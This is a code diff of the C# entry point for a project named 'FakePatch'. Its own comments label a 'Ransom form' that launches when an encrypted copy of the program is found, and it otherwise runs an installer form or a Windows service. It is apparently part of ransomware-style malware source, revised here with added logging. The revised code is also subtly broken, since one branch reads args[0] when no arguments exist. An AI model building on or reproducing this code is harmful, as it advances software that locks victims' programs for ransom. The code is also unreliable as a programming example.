@@ -5,8 +5,6 @@ using System.Windows.Forms;
 using static FakePatch.Globals;
 using static FakePatch.LogHelper;
 
-
-
 namespace FakePatch
 {
     internal static class Program
@@ -17,87 +15,39 @@ namespace FakePatch
         [STAThread]
         static void Main(string[] args)
         {
-            if (System.Environment.UserInteractive)
+            Application.EnableVisualStyles();
+            if (Environment.UserInteractive)
             {
-                //gUserInteractive = true;
+                Log("Interactive mode detected: running as application");
                 Log("Executable Path: " + Application.ExecutablePath);
                 Log("Is elevated? " + gIsElevated);
                 FileInfo ExecutablePath = new FileInfo(Application.ExecutablePath);
-                //Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)
                 FileInfo EncryptedExecutablePath = new FileInfo(Path.Combine(ExecutablePath.Directory.FullName, Path.ChangeExtension(ExecutablePath.Name, Path.GetExtension(ExecutablePath.Name) + ".enc")));
-                Log(EncryptedExecutablePath.FullName);
 
-                //Install form
-                if (args.Length > 0)
+                //Arguments check
+                if (args.Length > 0 && args[0] == "-install")
                 {
-                    switch (args[0])
-                    {
-                        case "-install":
-                            {
-                                Application.Run(new InstallForm(args[0]));
-                                /*
-                                Console.WriteLine("Service " + gServiceName + " is being installed");
-                                ManagedInstallerClass.InstallHelper(new string[] { "/LogFile=", "/LogToConsole=true", Assembly.GetExecutingAssembly().Location });
-                                sc.Start();
-                                */
-                                break;
-                            }
-                        /*
-                        case "-uninstall":
-                            {
-                                int a = 0;
-                                foreach (string arg in args)
-                                {
-                                    Log("args[" + a + "]: " + arg);
-                                    a++;
-                                }
-                                if (args.Length > 1)
-                                {
-                                    FileInfo e = new FileInfo(args[1]);
-                                    Log(e.FullName);
-                                }
-
-                                Install.UninstallService(gServiceName);
-                                foreach (string FilePath in gFilePaths)
-                                {
-                                    string message = string.Format("UninstallPatch {0}", FilePath);
-                                    Log(message);
-                                    Install.UninstallPatch(FilePath);
-                                }
-                                
-                                break;
-                            }
-                        */
-                        default:
-                            {
-                                if (File.Exists(EncryptedExecutablePath.FullName))
-                                {
-                                    //Ransom form
-                                    Application.Run(new UnlockForm());
-                                }
-                                else
-                                {
-                                    Application.Run(new InstallForm(args[0]));
-                                }
-                                break;
-                            }
-                    }
+                    Application.Run(new InstallForm(args[0]));
                 }
                 else
                 {
                     if (File.Exists(EncryptedExecutablePath.FullName))
                     {
                         //Ransom form
+                        Log("Found encrypted application in the same path: " + EncryptedExecutablePath.Name, LogLevel.Debug);
+                        Log("Going to run ransom form", LogLevel.Debug);
                         Application.Run(new UnlockForm());
                     }
                     else
                     {
-                        Application.Run(new InstallForm());
+                        Log("No encrypted files found. Going to run install form", LogLevel.Debug);
+                        Application.Run(new InstallForm(args[0]));
                     }
                 }
             }
             else
             {
+                Log("Not-interactive mode detected: running as service");
                 ServiceBase[] ServicesToRun;
                 ServicesToRun = new ServiceBase[]
                 {
